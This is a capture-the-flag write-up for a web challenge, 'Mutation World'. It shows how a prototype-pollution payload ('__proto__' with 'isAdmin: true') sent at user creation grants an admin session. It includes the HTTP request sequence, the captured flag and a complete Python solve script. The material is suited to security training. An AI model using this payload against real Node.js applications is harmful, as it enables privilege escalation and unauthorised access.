# Mutation World

## Description
The application is a Next.js site with username-only signup and login flows:    `POST /api/createUser` with JSON `{"username": "..."}`  `POST /api/login` with JSON `{"username": "..."}`    The dashboard frontend also reveals that a restricted attraction exists and that the backend may return a `flag` field when generating a ticket:    `POST /api/generateTicket` with JSON `{"attractionId": ...}`

## Category
Web

## Difficulty
Medium

## Approach
Analyze the target behavior, isolate the vulnerable primitive, and execute a reproducible exploit chain to retrieve the flag.

---
## Challenge summary

The application is a Next.js site with username-only signup and login flows:

- `POST /api/createUser` with JSON `{"username": "..."}`
- `POST /api/login` with JSON `{"username": "..."}`

The dashboard frontend also reveals that a restricted attraction exists and that the backend may return a `flag` field when generating a ticket:

- `POST /api/generateTicket` with JSON `{"attractionId": ...}`

## Root cause

The backend unsafely merges attacker-controlled JSON during user creation. By sending a `__proto__` object, we can prototype-pollute the created user so that `isAdmin` is inherited as `true`.

This payload is enough to create an admin session:

```json
{
  "username": "mutant_demo",
  "__proto__": {
    "isAdmin": true
  }
}
```

After logging in with that username, the dashboard renders with the `ADMIN` badge and exposes the hidden attraction:

- `Capture The Flag`
- `attractionId: 5`
- `restricted: true`

## Exploitation steps

1. Register a user with a JSON body that includes `__proto__.isAdmin = true`.
2. Log in as that same user.
3. Request a ticket for attraction `5`.
4. Read the `flag` field from the JSON response.

## Live exploit request sequence

```http
POST /api/createUser
Content-Type: application/json

{"username":"mutant_demo","__proto__":{"isAdmin":true}}
```

```http
POST /api/login
Content-Type: application/json

{"username":"mutant_demo"}
```

```http
POST /api/generateTicket
Content-Type: application/json

{"attractionId":5}
```

Observed response:

```json
{
  "message": "Ticket Generated",
  "flag": "VBD{prototype_pollut1on_1s_fun_25ec66eed809077f24e1e750b828e179}"
}
```

## Flag

```text
VBD{prototype_pollut1on_1s_fun_25ec66eed809077f24e1e750b828e179}
```

## Solve script

```python
import argparse
import random
import re
import string
import sys

import requests


def random_username(prefix: str = "mutant") -> str:
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    return f"{prefix}_{suffix}"


def create_admin_session(base_url: str, username: str) -> requests.Session:
    session = requests.Session()

    create_response = session.post(
        f"{base_url}/api/createUser",
        json={"username": username, "__proto__": {"isAdmin": True}},
        timeout=10,
    )
    create_response.raise_for_status()

    login_response = session.post(
        f"{base_url}/api/login",
        json={"username": username},
        timeout=10,
    )
    login_response.raise_for_status()

    return session


def fetch_flag(base_url: str, session: requests.Session) -> str:
    ticket_response = session.post(
        f"{base_url}/api/generateTicket",
        json={"attractionId": 5},
        timeout=10,
    )
    ticket_response.raise_for_status()

    data = ticket_response.json()
    flag = data.get("flag", "")
    if not re.fullmatch(r"VBD\{[^}]+\}", flag):
        raise ValueError(f"Unexpected response: {data}")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve the Mutation World web challenge")
    parser.add_argument(
        "--url",
        default="http://ctf.vulnbydefault.com:36201",
        help="Base URL of the Mutation World instance",
    )
    parser.add_argument(
        "--username",
        default=random_username(),
        help="Username to register for the exploit",
    )
    args = parser.parse_args()

    try:
        session = create_admin_session(args.url.rstrip("/"), args.username)
        flag = fetch_flag(args.url.rstrip("/"), session)
    except Exception as exc:
        print(f"[!] Exploit failed: {exc}", file=sys.stderr)
        return 1

    print(f"[+] Username: {args.username}")
    print(f"[+] Flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Run

```bash
python solve_mutation_world.py
```

